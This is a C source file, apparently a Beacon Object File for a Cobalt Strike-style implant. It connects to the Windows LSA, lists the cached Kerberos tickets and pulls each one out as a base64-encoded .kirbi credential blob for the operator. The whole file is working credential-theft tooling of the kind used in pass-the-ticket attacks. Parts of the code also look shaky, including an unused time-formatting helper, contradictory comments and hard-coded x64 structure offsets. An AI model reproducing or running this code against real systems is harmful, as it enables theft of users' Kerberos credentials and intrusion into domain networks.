/*
 * extracttickets.c — Extract Kerberos tickets from LSA cache
 *
 * Uses secur32.dll:
 *   LsaConnectUntrusted -> LsaLookupAuthenticationPackage("Kerberos")
 *   -> LsaCallAuthenticationPackage(KERB_QUERY_TKT_CACHE_EX)
 *   -> LsaCallAuthenticationPackage(KERB_RETRIEVE_ENCODED_TICKET)
 *
 * First enumerates tickets, then retrieves each one as a full .kirbi blob.
 */
#include <windows.h>
#define SECURITY_WIN32
#include <security.h>
#include <ntsecapi.h>
#include "beacon_compat.h"

DECLSPEC_IMPORT NTSTATUS NTAPI SECUR32$LsaConnectUntrusted(PHANDLE);
DECLSPEC_IMPORT NTSTATUS NTAPI SECUR32$LsaLookupAuthenticationPackage(HANDLE, PLSA_STRING, PULONG);
DECLSPEC_IMPORT NTSTATUS NTAPI SECUR32$LsaCallAuthenticationPackage(
    HANDLE, ULONG, PVOID, ULONG, PVOID*, PULONG, PNTSTATUS);
DECLSPEC_IMPORT NTSTATUS NTAPI SECUR32$LsaFreeReturnBuffer(PVOID);
DECLSPEC_IMPORT NTSTATUS NTAPI SECUR32$LsaDeregisterLogonProcess(HANDLE);

DECLSPEC_IMPORT int WINAPI KERNEL32$WideCharToMultiByte(UINT, DWORD, LPCWCH, int, LPSTR, int, LPCCH, LPBOOL);
DECLSPEC_IMPORT int WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCCH, int, LPWSTR, int);

DECLSPEC_IMPORT int    __cdecl MSVCRT$sscanf(const char*, const char*, ...);
DECLSPEC_IMPORT int    __cdecl MSVCRT$snprintf(char*, size_t, const char*, ...);
DECLSPEC_IMPORT size_t __cdecl MSVCRT$strlen(const char*);
DECLSPEC_IMPORT int    __cdecl MSVCRT$memset(void*, int, size_t);
DECLSPEC_IMPORT void*  __cdecl MSVCRT$memcpy(void*, const void*, size_t);

/* KERB_PROTOCOL_MESSAGE_TYPE values */
#define KerbRetrieveEncodedTicketMessage  8
#define KerbQueryTicketCacheExMessage    14

/* Cache options */
#ifndef KERB_RETRIEVE_TICKET_AS_KERB_CRED
#define KERB_RETRIEVE_TICKET_AS_KERB_CRED  8
#endif
#ifndef KERB_RETRIEVE_TICKET_DEFAULT
#define KERB_RETRIEVE_TICKET_DEFAULT       0
#endif
#ifndef KERB_RETRIEVE_TICKET_DONT_USE_CACHE
#define KERB_RETRIEVE_TICKET_DONT_USE_CACHE 4
#endif

#pragma pack(push, 1)

typedef struct _MY_KERB_QUERY_TKT_CACHE_EX_REQUEST {
    ULONG MessageType;   /* KerbQueryTicketCacheExMessage = 14 */
    LUID  LogonId;
} MY_KERB_QUERY_TKT_CACHE_EX_REQUEST;

typedef struct _MY_KERB_TICKET_CACHE_INFO_EX {
    UNICODE_STRING ClientName;
    UNICODE_STRING ClientRealm;
    UNICODE_STRING ServerName;
    UNICODE_STRING ServerRealm;
    LARGE_INTEGER  StartTime;
    LARGE_INTEGER  EndTime;
    LARGE_INTEGER  RenewTime;
    LONG           EncryptionType;
    ULONG          TicketFlags;
} MY_KERB_TICKET_CACHE_INFO_EX;

typedef struct _MY_KERB_QUERY_TKT_CACHE_EX_RESPONSE {
    ULONG MessageType;
    ULONG CountOfTickets;
    /* Followed by MY_KERB_TICKET_CACHE_INFO_EX[CountOfTickets] */
} MY_KERB_QUERY_TKT_CACHE_EX_RESPONSE;

/*
 * KERB_RETRIEVE_TKT_REQUEST — used to retrieve the actual ticket data.
 * The TargetName is a UNICODE_STRING that must be set to the SPN.
 * The UNICODE_STRING buffer is appended after the struct.
 */
typedef struct _MY_KERB_RETRIEVE_TKT_REQUEST {
    ULONG          MessageType;      /* KerbRetrieveEncodedTicketMessage = 8 */
    LUID           LogonId;
    UNICODE_STRING TargetName;       /* SPN of the ticket to retrieve */
    ULONG          TicketFlags;
    ULONG          CacheOptions;     /* KERB_RETRIEVE_TICKET_AS_KERB_CRED = 8 */
    LONG           EncryptionType;
    SecHandle      CredentialsHandle;
} MY_KERB_RETRIEVE_TKT_REQUEST;

typedef struct _MY_KERB_RETRIEVE_TKT_RESPONSE {
    /* KERB_EXTERNAL_TICKET struct follows */
    /* We only care about the encoded ticket at the end */
    ULONG dummy;  /* placeholder — real struct is complex */
} MY_KERB_RETRIEVE_TKT_RESPONSE;

/*
 * KERB_EXTERNAL_TICKET is complex. The actual encoded KRB-CRED data
 * is at a known offset. We'll parse it by looking for the ASN.1
 * KRB-CRED tag (0x76 = [APPLICATION 22]).
 */

#pragma pack(pop)

static const char b64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static char *base64_encode(const unsigned char *data, int len) {
    int out_len = ((len + 2) / 3) * 4;
    char *out = (char *)malloc(out_len + 1);
    if (!out) return NULL;

    int i, j;
    for (i = 0, j = 0; i < len; i += 3, j += 4) {
        unsigned int n = ((unsigned int)data[i]) << 16;
        if (i + 1 < len) n |= ((unsigned int)data[i + 1]) << 8;
        if (i + 2 < len) n |= data[i + 2];

        out[j]     = b64[(n >> 18) & 0x3F];
        out[j + 1] = b64[(n >> 12) & 0x3F];
        out[j + 2] = (i + 1 < len) ? b64[(n >> 6) & 0x3F] : '=';
        out[j + 3] = (i + 2 < len) ? b64[n & 0x3F] : '=';
    }
    out[j] = '\0';
    return out;
}

/* Format Windows FILETIME as human-readable */
static void filetime_to_str(LARGE_INTEGER ft, char *buf, int buf_len) {
    FILETIME fTime;
    SYSTEMTIME st;
    fTime.dwLowDateTime  = ft.LowPart;
    fTime.dwHighDateTime = ft.HighPart;
    /* We can't use FileTimeToSystemTime — just show raw value */
    /* Actually we can — it's kernel32 */
    MSVCRT$snprintf(buf, buf_len, "%08X:%08X", ft.HighPart, ft.LowPart);
}

/*
 * Retrieve a single ticket as KRB-CRED (.kirbi) blob.
 * Returns allocated buffer (caller frees), or NULL on failure.
 */
static unsigned char *retrieve_ticket(HANDLE hLsa, ULONG kerbPackage, LUID *logonId,
                                       UNICODE_STRING *serverName, int *out_len) {
    *out_len = 0;

    /* Build request with the target SPN appended */
    ULONG reqSize = sizeof(MY_KERB_RETRIEVE_TKT_REQUEST) + serverName->MaximumLength;
    unsigned char *reqBuf = (unsigned char *)malloc(reqSize);
    if (!reqBuf) return NULL;

    MSVCRT$memset(reqBuf, 0, reqSize);
    MY_KERB_RETRIEVE_TKT_REQUEST *req = (MY_KERB_RETRIEVE_TKT_REQUEST *)reqBuf;
    req->MessageType = KerbRetrieveEncodedTicketMessage;
    req->LogonId = *logonId;
    req->CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED;
    req->EncryptionType = 0;  /* Don't care about etype */
    req->TicketFlags = 0;

    /* Set TargetName — buffer points into space after the struct */
    req->TargetName.Length = serverName->Length;
    req->TargetName.MaximumLength = serverName->MaximumLength;
    req->TargetName.Buffer = (PWSTR)(reqBuf + sizeof(MY_KERB_RETRIEVE_TKT_REQUEST));
    MSVCRT$memcpy(req->TargetName.Buffer, serverName->Buffer, serverName->Length);

    /* Call LSA */
    PVOID response = NULL;
    ULONG responseLen = 0;
    NTSTATUS protStatus;
    NTSTATUS status = SECUR32$LsaCallAuthenticationPackage(
        hLsa, kerbPackage, reqBuf, reqSize,
        &response, &responseLen, &protStatus);

    free(reqBuf);

    if (status != 0 || protStatus != 0 || !response || responseLen == 0) {
        return NULL;
    }

    /*
     * The response is a KERB_RETRIEVE_TKT_RESPONSE containing a KERB_EXTERNAL_TICKET.
     * The KERB_EXTERNAL_TICKET has the encoded ticket at the end.
     *
     * KERB_EXTERNAL_TICKET layout (x64):
     *   +0x00: ServiceName (PKERB_EXTERNAL_NAME)
     *   +0x08: TargetName (PKERB_EXTERNAL_NAME)
     *   +0x10: ClientName (PKERB_EXTERNAL_NAME)
     *   +0x18: DomainName (UNICODE_STRING — 16 bytes)
     *   +0x28: TargetDomainName (UNICODE_STRING — 16 bytes)
     *   +0x38: AltTargetDomainName (UNICODE_STRING — 16 bytes)
     *   +0x48: SessionKey (KERB_CRYPTO_KEY — 4+4+8 = 16 bytes)
     *   +0x58: TicketFlags (ULONG)
     *   +0x5C: Flags (ULONG)
     *   +0x60: KeyExpirationTime (LARGE_INTEGER)
     *   +0x68: StartTime (LARGE_INTEGER)
     *   +0x70: EndTime (LARGE_INTEGER)
     *   +0x78: RenewUntil (LARGE_INTEGER)
     *   +0x80: TimeSkew (LARGE_INTEGER)
     *   +0x88: EncodedTicketSize (ULONG)
     *   +0x8C: padding (4 bytes for alignment)
     *   +0x90: EncodedTicket (PUCHAR)
     *
     * We need EncodedTicketSize at offset 0x88 and EncodedTicket pointer at 0x90.
     */
    unsigned char *resp = (unsigned char *)response;

    /* Skip the ULONG MessageType at the start of KERB_RETRIEVE_TKT_RESPONSE */
    /* Actually the response starts directly with the KERB_EXTERNAL_TICKET after the message type (4 bytes + 4 padding) */
    unsigned char *ticket_struct = resp;

    /* Read EncodedTicketSize and EncodedTicket pointer */
    /* Offsets depend on architecture. On x64: */
    ULONG encodedTicketSize = *(ULONG *)(ticket_struct + 0x88);
    unsigned char *encodedTicket = *(unsigned char **)(ticket_struct + 0x90);

    if (encodedTicketSize > 0 && encodedTicket != NULL) {
        unsigned char *result = (unsigned char *)malloc(encodedTicketSize);
        if (result) {
            MSVCRT$memcpy(result, encodedTicket, encodedTicketSize);
            *out_len = (int)encodedTicketSize;
        }
        SECUR32$LsaFreeReturnBuffer(response);
        return result;
    }

    SECUR32$LsaFreeReturnBuffer(response);
    return NULL;
}

void go(char *args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);

    char *luid_str = BeaconDataExtract(&parser, NULL);
    char *service_filter = BeaconDataExtract(&parser, NULL);

    HANDLE hLsa;
    NTSTATUS status = SECUR32$LsaConnectUntrusted(&hLsa);
    if (status != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] LsaConnectUntrusted failed: 0x%08X\n", status);
        return;
    }

    /* Lookup Kerberos package */
    LSA_STRING kerbName;
    kerbName.Buffer = "Kerberos";
    kerbName.Length = 8;
    kerbName.MaximumLength = 9;
    ULONG kerbPackage;
    status = SECUR32$LsaLookupAuthenticationPackage(hLsa, &kerbName, &kerbPackage);
    if (status != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] LsaLookupAuthenticationPackage failed: 0x%08X\n", status);
        SECUR32$LsaDeregisterLogonProcess(hLsa);
        return;
    }

    /* Parse LUID if specified */
    LUID targetLuid = {0};
    if (luid_str && *luid_str) {
        unsigned long long val = 0;
        MSVCRT$sscanf(luid_str, "%llx", &val);
        targetLuid.LowPart = (DWORD)(val & 0xFFFFFFFF);
        targetLuid.HighPart = (LONG)(val >> 32);
    }

    /* 1. Enumerate cached tickets */
    MY_KERB_QUERY_TKT_CACHE_EX_REQUEST cacheReq;
    cacheReq.MessageType = KerbQueryTicketCacheExMessage;
    cacheReq.LogonId = targetLuid;

    MY_KERB_QUERY_TKT_CACHE_EX_RESPONSE *cacheResp = NULL;
    ULONG cacheRespLen = 0;
    NTSTATUS protStatus;

    status = SECUR32$LsaCallAuthenticationPackage(
        hLsa, kerbPackage, &cacheReq, sizeof(cacheReq),
        (PVOID*)&cacheResp, &cacheRespLen, &protStatus);

    if (status != 0 || protStatus != 0 || !cacheResp) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Ticket cache enumeration failed: 0x%08X / 0x%08X\n",
                     status, protStatus);
        SECUR32$LsaDeregisterLogonProcess(hLsa);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Found %u cached ticket(s)\n", cacheResp->CountOfTickets);

    /* 2. For each ticket, print info and retrieve .kirbi */
    MY_KERB_TICKET_CACHE_INFO_EX *tickets =
        (MY_KERB_TICKET_CACHE_INFO_EX *)((PBYTE)cacheResp + sizeof(MY_KERB_QUERY_TKT_CACHE_EX_RESPONSE));

    int extracted = 0;
    for (ULONG i = 0; i < cacheResp->CountOfTickets; i++) {
        /* Convert names to ANSI for display */
        char clientName[256] = {0}, serverName[256] = {0};
        char clientRealm[256] = {0}, serverRealm[256] = {0};
        KERNEL32$WideCharToMultiByte(CP_UTF8, 0, tickets[i].ClientName.Buffer,
            tickets[i].ClientName.Length / 2, clientName, 255, NULL, NULL);
        KERNEL32$WideCharToMultiByte(CP_UTF8, 0, tickets[i].ServerName.Buffer,
            tickets[i].ServerName.Length / 2, serverName, 255, NULL, NULL);
        KERNEL32$WideCharToMultiByte(CP_UTF8, 0, tickets[i].ClientRealm.Buffer,
            tickets[i].ClientRealm.Length / 2, clientRealm, 255, NULL, NULL);
        KERNEL32$WideCharToMultiByte(CP_UTF8, 0, tickets[i].ServerRealm.Buffer,
            tickets[i].ServerRealm.Length / 2, serverRealm, 255, NULL, NULL);

        /* Apply service filter if specified */
        if (service_filter && *service_filter) {
            /* Simple substring match */
            BOOL match = FALSE;
            for (int si = 0; serverName[si]; si++) {
                int fi = 0;
                while (service_filter[fi] && serverName[si + fi] &&
                       (serverName[si + fi] == service_filter[fi] ||
                        (serverName[si + fi] >= 'A' && serverName[si + fi] <= 'Z' &&
                         serverName[si + fi] + 32 == service_filter[fi]) ||
                        (service_filter[fi] >= 'A' && service_filter[fi] <= 'Z' &&
                         service_filter[fi] + 32 == serverName[si + fi]))) {
                    fi++;
                }
                if (!service_filter[fi]) { match = TRUE; break; }
            }
            if (!match) continue;
        }

        /* Decode ticket flags */
        const char *flag_str = "";
        ULONG tf = tickets[i].TicketFlags;
        char flags_buf[256] = {0};
        int fpos = 0;
        if (tf & 0x40000000) fpos += MSVCRT$snprintf(flags_buf + fpos, sizeof(flags_buf) - fpos, "forwardable ");
        if (tf & 0x20000000) fpos += MSVCRT$snprintf(flags_buf + fpos, sizeof(flags_buf) - fpos, "forwarded ");
        if (tf & 0x10000000) fpos += MSVCRT$snprintf(flags_buf + fpos, sizeof(flags_buf) - fpos, "proxiable ");
        if (tf & 0x04000000) fpos += MSVCRT$snprintf(flags_buf + fpos, sizeof(flags_buf) - fpos, "renewable ");
        if (tf & 0x00400000) fpos += MSVCRT$snprintf(flags_buf + fpos, sizeof(flags_buf) - fpos, "pre_authent ");
        (void)flag_str;

        BeaconPrintf(CALLBACK_OUTPUT,
            "\n[%u] Client: %s@%s\n"
            "    Server: %s@%s\n"
            "    Etype:  %d\n"
            "    Flags:  0x%08X (%s)\n",
            i, clientName, clientRealm, serverName, serverRealm,
            tickets[i].EncryptionType, tickets[i].TicketFlags, flags_buf);

        /* 3. Retrieve full ticket as KRB-CRED (.kirbi) */
        int kirbiLen = 0;
        unsigned char *kirbi = retrieve_ticket(hLsa, kerbPackage, &targetLuid,
                                               &tickets[i].ServerName, &kirbiLen);

        if (kirbi && kirbiLen > 0) {
            char *b64data = base64_encode(kirbi, kirbiLen);
            if (b64data) {
                BeaconPrintf(CALLBACK_OUTPUT, "    Kirbi (%d bytes):\n", kirbiLen);

                /* Print base64 in 76-char lines */
                int b64len = (int)MSVCRT$strlen(b64data);
                int offset = 0;
                while (offset < b64len) {
                    int chunk = b64len - offset;
                    if (chunk > 76) chunk = 76;
                    /* Print chunk */
                    char line[80];
                    MSVCRT$memcpy(line, b64data + offset, chunk);
                    line[chunk] = '\0';
                    BeaconPrintf(CALLBACK_OUTPUT, "      %s\n", line);
                    offset += chunk;
                }
                free(b64data);
            }
            free(kirbi);
            extracted++;
        } else {
            BeaconPrintf(CALLBACK_ERROR, "    [!] Failed to retrieve ticket data\n");
        }
    }

    SECUR32$LsaFreeReturnBuffer(cacheResp);
    SECUR32$LsaDeregisterLogonProcess(hLsa);

    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Extracted %d ticket(s) as .kirbi\n", extracted);
}
